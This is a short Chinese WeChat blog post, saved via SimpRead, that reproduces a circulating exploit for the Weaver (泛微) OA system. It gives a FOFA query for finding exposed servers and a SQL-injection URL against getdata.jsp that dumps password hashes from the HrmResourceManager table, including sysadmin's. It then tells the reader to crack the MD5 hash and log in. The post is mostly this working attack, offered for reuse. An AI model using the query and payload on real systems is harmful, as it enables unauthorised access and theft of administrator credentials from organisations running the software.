> 本文由 [简悦 SimpRead](http://ksria.com/simpread/) 转码， 原文地址 [mp.weixin.qq.com](https://mp.weixin.qq.com/s/3tuDJyUWKS8yiLRsfvn2WQ)

```
FOFA:app="Weaver-OA"
```

拿前几天网上传的 exp 复现：

查询 HrmResourceManager 表中的 password，及用户 sysadmin 的登录密码：  

```
/js/hrm/getdata.jsp?cmd=getSelectAllId&sql=select%20password%20as%20id%20from%20HrmResourceManager
```

![](https://mmbiz.qpic.cn/mmbiz_png/flBFrCh5pNZ3KpdGSupNMsf5t7uL8ibC022icnPcjFYTOWibia2nq0cC4UjWoOkoTwicjvHcvwQW4EB6lrJl76IOgTQ/640?wx_fmt=png)

MD5 解密然后登录即可：  

![](https://mmbiz.qpic.cn/mmbiz_png/flBFrCh5pNZ3KpdGSupNMsf5t7uL8ibC0xW62aW8Licic9PgA7ZWV2liaibcHcDEOYibZeH0DEL2lNjH2lofj3ibwUC4g/640?wx_fmt=png)

公众号